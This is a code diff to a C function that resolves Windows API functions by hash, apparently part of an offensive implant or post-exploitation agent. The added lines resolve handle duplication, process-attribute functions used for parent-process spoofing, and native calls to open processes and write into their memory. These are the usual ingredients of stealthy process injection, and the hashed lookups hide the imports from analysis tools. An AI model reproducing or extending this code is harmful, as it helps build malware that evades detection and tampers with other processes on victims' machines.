@@ -231,8 +231,12 @@ BOOL Win32ApiInit(PWin32Api pApi)
     pApi->pfnReadFile = (fnReadFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_READFILE_HASH);
     pApi->pfnWriteFile = (fnWriteFile)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_WRITEFILE_HASH);
     pApi->pfnCloseHandle = (fnCloseHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CLOSEHANDLE_HASH);
+    pApi->pfnDuplicateHandle = (fnDuplicateHandle)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DUPLICATEHANDLE_HASH);
     pApi->pfnGetFileSize = (fnGetFileSize)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_GETFILESIZE_HASH);
     pApi->pfnCreateProcessW = (fnCreateProcessW)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_CREATEPROCESSW_HASH);
+    pApi->pfnInitializeProcThreadAttributeList = (fnInitializeProcThreadAttributeList)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_INITIALIZEPROCTHREADATTRIBUTELIST_HASH);
+    pApi->pfnUpdateProcThreadAttribute = (fnUpdateProcThreadAttribute)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_UPDATEPROCTHREADATTRIBUTE_HASH);
+    pApi->pfnDeleteProcThreadAttributeList = (fnDeleteProcThreadAttributeList)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_DELETEPROCTHREADATTRIBUTELIST_HASH);
     pApi->pfnOpenProcess = (fnOpenProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_OPENPROCESS_HASH);
     pApi->pfnTerminateProcess = (fnTerminateProcess)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_TERMINATEPROCESS_HASH);
     pApi->pfnVirtualAlloc = (fnVirtualAlloc)GetApiAddressByHash(hKernel32, H_MOD_KERNEL32_DLL_HASH, H_FUNC_VIRTUALALLOC_HASH);
@@ -326,6 +330,8 @@ BOOL Win32ApiInit(PWin32Api pApi)
     pApi->pfnNtTerminateThread = (fnNtTerminateThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTTERMINATETHREAD_HASH);
     pApi->pfnNtAllocateVirtualMemory = (fnNtAllocateVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTALLOCATEVIRTUALMEMORY_HASH);
     pApi->pfnNtProtectVirtualMemory = (fnNtProtectVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTPROTECTVIRTUALMEMORY_HASH);
+    pApi->pfnNtWriteVirtualMemory = (fnNtWriteVirtualMemory)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTWRITEVIRTUALMEMORY_HASH);
+    pApi->pfnNtOpenProcess = (fnNtOpenProcess)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_NTOPENPROCESS_HASH);
     pApi->pfnLdrGetProcedureAddress = (fnLdrGetProcedureAddress)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_LDRGETPROCEDUREADDRESS_HASH);
     pApi->pfnRtlExitUserThread = (fnRtlExitUserThread)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLEXITUSERTHREAD_HASH);
     pApi->pfnRtlAddVectoredExceptionHandler = (fnRtlAddVectoredExceptionHandler)GetApiAddressByHash(hNtdll, H_MOD_NTDLL_DLL_HASH, H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER_HASH);
@@ -406,6 +412,7 @@ BOOL Win32ApiInit(PWin32Api pApi)
            pApi->pfnReadFile != NULL &&
            pApi->pfnWriteFile != NULL &&
            pApi->pfnCloseHandle != NULL &&
+           pApi->pfnDuplicateHandle != NULL &&
            pApi->pfnCreateProcessW != NULL &&
            pApi->pfnOpenProcess != NULL &&
            pApi->pfnVirtualAlloc != NULL &&
